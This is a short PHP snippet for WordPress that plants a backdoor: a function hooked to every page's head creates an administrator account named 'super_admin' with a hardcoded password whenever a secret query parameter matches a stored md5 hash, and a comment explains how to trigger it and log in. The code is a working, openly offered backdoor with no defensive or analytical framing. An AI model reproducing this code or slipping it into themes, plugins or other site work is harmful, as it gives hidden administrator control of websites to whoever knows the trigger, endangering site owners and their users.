<?php 

/*
  - Open yoursite.com/?backdoor=open
  - WP will create a new user with administrator role
  - Open yoursite.com/wp-admin and log in with the set credentials
*/

add_action('wp_head', 'my_create_backdoor');
function my_create_backdoor() {
  if(md5($_GET['backdoor']) === '7cef8a734855777c2a9d0caf42666e69') {
    require('wp-includes/registration.php');
    if(!username_exists('super_admin')) {
      $user_id = wp_create_user('super_admin', 'LetMeIn!');
      $user = new WP_User($user_id);
      $user->set_role('administrator');
    }
  }
}